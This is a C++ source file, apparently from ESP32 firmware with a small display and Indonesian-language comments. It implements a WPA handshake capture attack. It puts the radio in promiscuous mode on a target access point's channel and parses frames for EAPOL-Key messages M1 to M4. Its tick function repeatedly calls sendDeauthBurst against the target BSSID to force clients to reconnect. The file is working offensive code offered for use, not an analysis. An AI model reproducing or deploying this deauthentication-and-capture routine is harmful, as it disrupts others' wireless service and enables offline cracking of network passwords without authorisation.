#include "eapol.h"
#include "ui_helpers.h"
#include "wifi_state.h"
#include "attack_engine.h"
#include "state_machine.h"
#include "recon.h"
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/portmacro.h"

bool isEapolRunning = false;
unsigned long eapolStartTime = 0;
int eapolM1 = 0;
int eapolM2 = 0;
int eapolM3 = 0;
int eapolM4 = 0;
int eapolFull = 0;
int eapolPacketCount = 0;

static bool sawM1 = false;
static bool sawM2 = false;
static bool sawM3 = false;
static bool sawM4 = false;

static portMUX_TYPE g_eapolMux = portMUX_INITIALIZER_UNLOCKED;

struct EapolSnapshot {
  int m1, m2, m3, m4, full, packets;
};
static EapolSnapshot eapolSnap() {
  EapolSnapshot s;
  portENTER_CRITICAL(&g_eapolMux);
  s.m1 = eapolM1; s.m2 = eapolM2; s.m3 = eapolM3; s.m4 = eapolM4;
  s.full = eapolFull; s.packets = eapolPacketCount;
  portEXIT_CRITICAL(&g_eapolMux);
  return s;
}

static void eapolCaptureCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!isEapolRunning) return;
  if (type != WIFI_PKT_DATA) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  uint16_t sig_len = pkt->rx_ctrl.sig_len;
  if (sig_len < 32) return;

  // Cari header QoS/non-QoS + LLC/SNAP presisi untuk EtherType 0x888E.
  int eapolPos = -1;
  for (int hl = 24; hl <= 26 && hl + 8 <= sig_len; hl += 2) {
    if (p[hl] == 0xAA && p[hl + 1] == 0xAA && p[hl + 2] == 0x03 &&
        p[hl + 3] == 0x00 && p[hl + 4] == 0x00 && p[hl + 5] == 0x00 &&
        p[hl + 6] == 0x88 && p[hl + 7] == 0x8E) {
      eapolPos = hl + 8;
      break;
    }
  }
  if (eapolPos < 0) return;

  // EAPOL header: version(1), type(1), length(2)
  if (eapolPos + 4 > sig_len) return;
  uint8_t eapolType = p[eapolPos + 1];
  if (eapolType != 3) return; // hanya EAPOL-Key yang relevan untuk handshake

  // Tentukan arah: AP->client jika addr2 == BSSID, client->AP jika addr1 == BSSID
  bool fromAP = (memcmp(&p[10], g_targetBSSID, 6) == 0);
  bool toAP   = (memcmp(&p[4],  g_targetBSSID, 6) == 0);

  portENTER_CRITICAL(&g_eapolMux);
  eapolPacketCount++;

  if (fromAP && !sawM1) { sawM1 = true; eapolM1++; }
  else if (toAP && sawM1 && !sawM2) { sawM2 = true; eapolM2++; }
  else if (fromAP && sawM1 && sawM2 && !sawM3) { sawM3 = true; eapolM3++; }
  else if (toAP && sawM1 && sawM2 && sawM3 && !sawM4) {
    sawM4 = true; eapolM4++; eapolFull++;
  }
  portEXIT_CRITICAL(&g_eapolMux);
}

void startEapolCapture() {
  if (targetSSID.length() == 0) {
    tft.fillScreen(TFT_BLACK);
    drawHeader("EAPOL CAPTURE", TFT_ORANGE);
    tft.setTextFont(2);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(10, 40); tft.println("Target belum dipilih.");
    tft.setCursor(10, 60); tft.println("Pilih AP dulu lewat");
    tft.setCursor(10, 80); tft.println("menu EAPOL CAPTURE.");
    delay(300);
    currentState = MAIN_MENU;
    drawMainMenu();
    return;
  }

  radioSetMode(RADIO_STA);
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(eapolCaptureCb);

  eapolM1 = eapolM2 = eapolM3 = eapolM4 = eapolFull = 0;
  eapolPacketCount = 0;
  sawM1 = sawM2 = sawM3 = sawM4 = false;
  eapolStartTime = millis();
  isEapolRunning = true;
  radioSetPromiscuous(true, g_targetChannel);

  drawEapolCapture(0);
  Serial.printf("[EAPOL] Capture start %s ch=%d\n", targetSSID.c_str(), g_targetChannel);
}

void stopEapolCapture() {
  esp_wifi_set_promiscuous(false);
  radioSetMode(RADIO_STA);
  isEapolRunning = false;
  Serial.println("[EAPOL] Capture stop");
}

void eapolCaptureTick() {
  if (!isEapolRunning) return;

  static unsigned long lastDeauth = 0;
  static unsigned long lastDraw = 0;
  unsigned long now = millis();

  if (now - lastDeauth > 900) {
    lastDeauth = now;
    sendDeauthBurst(g_targetBSSID);
  }
  if (now - lastDraw > 500) {
    lastDraw = now;
    drawEapolCapture(0);
  }
}

#if NISKALA_HAS_TFT
void drawEapolCapture(int frame) {
  (void)frame;
  tft.fillScreen(TFT_BLACK);
  drawHeader("EAPOL CAPTURE", TFT_ORANGE);
  tft.setTextFont(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setCursor(4, 28);
  tft.print(targetSSID.substring(0, 18));
  tft.print(" ch="); tft.print(g_targetChannel);

  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
           g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5]);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(4, 44);
  tft.print(mac);

  EapolSnapshot es = eapolSnap();
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(4, 66);
  tft.printf("M1:%d  M2:%d  M3:%d  M4:%d", es.m1, es.m2, es.m3, es.m4);
  tft.setCursor(4, 82);
  tft.printf("FULL:%d  EAPOL:%d", es.full, es.packets);

  unsigned long elapsed = (millis() - eapolStartTime) / 1000;
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(4, 102);
  tft.print("TIME:"); tft.print(elapsed); tft.print("s");

  drawFooter("TOMBOL = STOP");
}
#else
void drawEapolCapture(int) {}

#endif

String buildEapolJson() {
  String j = "{\"target\":\"" + String(targetSSID) + "\",";
  j += "\"bssid\":\"";
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
           g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5]);
  j += String(mac);
  j += "\",\"channel\":" + String(g_targetChannel);
  EapolSnapshot es = eapolSnap();
  j += ",\"m1\":" + String(es.m1);
  j += ",\"m2\":" + String(es.m2);
  j += ",\"m3\":" + String(es.m3);
  j += ",\"m4\":" + String(es.m4);
  j += ",\"full\":" + String(es.full);
  j += ",\"packets\":" + String(es.packets);
  j += ",\"uptime_s\":" + String((unsigned long)(millis()/1000));
  j += "}";
  return j;
}